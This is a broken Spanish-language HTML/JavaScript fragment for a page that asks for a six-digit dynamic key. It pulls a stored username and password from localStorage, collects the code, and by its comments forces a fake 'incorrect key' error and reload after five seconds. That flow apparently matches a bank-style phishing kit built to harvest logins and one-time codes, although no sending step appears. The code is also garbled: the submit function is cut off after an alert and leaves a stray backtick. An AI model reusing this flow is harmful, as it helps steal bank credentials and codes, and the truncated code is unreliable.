  <div class="content" id="content">

  <script>
    // Si en la carga de la p√°gina se encontr√≥ el flag "claveError", mostrar el mensaje de error y eliminar el flag.
    document.addEventListener("DOMContentLoaded", function () {
      if (localStorage.getItem('claveError')) {
        document.getElementById('errorContainer').innerHTML = `
          <h3>Error403: Clave din√°mica incorrecta.</h3>
          <p>Intente con otra diferente.</p>
        `;
        localStorage.removeItem('claveError');
      }
      
      // L√≥gica para el manejo de los 6 inputs de la clave din√°mica.
      const inputs = document.querySelectorAll(".digit-input");

      function isDigit(char) {
        return /^\d$/.test(char);
      }

      function distributeDigits(str) {
        const digits = str.replace(/\D/g, "").split("").slice(0, inputs.length);
        inputs.forEach((input, i) => input.value = digits[i] || "");
        if (digits.length < inputs.length) {
          inputs[digits.length].focus();
        }
      }

      inputs.forEach((input, index) => {
        input.addEventListener("input", (e) => {
          const char = e.target.value;
          if (!isDigit(char)) {
            e.target.value = "";
            return;
          }
          if (index < inputs.length - 1) {
            inputs[index + 1].focus();
          }
        });

        input.addEventListener("keydown", (e) => {
          if (e.key === "Backspace" && e.target.value === "" && index > 0) {
            inputs[index - 1].focus();
          }
          if (e.key === "Enter") {
            e.preventDefault();
          }
        });

        input.addEventListener("paste", (e) => {
          e.preventDefault();
          const pasted = e.clipboardData.getData("text");
          distributeDigits(pasted);
        });
      });
      inputs[0].focus();
    });

    // Funci√≥n principal que se ejecuta al hacer clic en "Continuar"
    function enviarDatos() {
      // Recuperar usuario y clave almacenados de p√°ginas anteriores
      const usuario = localStorage.getItem('user');
      const clave = localStorage.getItem('clave');
      // Recoger la clave din√°mica de los 6 inputs
      let claveDinamica = "";
      document.querySelectorAll(".digit-input").forEach(input => {
        claveDinamica += input.value;
      });

      // Validar que todos los campos est√©n completos
      if (!usuario || !clave || claveDinamica.length !== 6) {
        alert("Por favor, completa correctamente la clave din√°mica.");

      `;
      
      // Despu√©s de 5 segundos, se establece el flag de error y se recarga la p√°gina autom√°ticamente.

    }
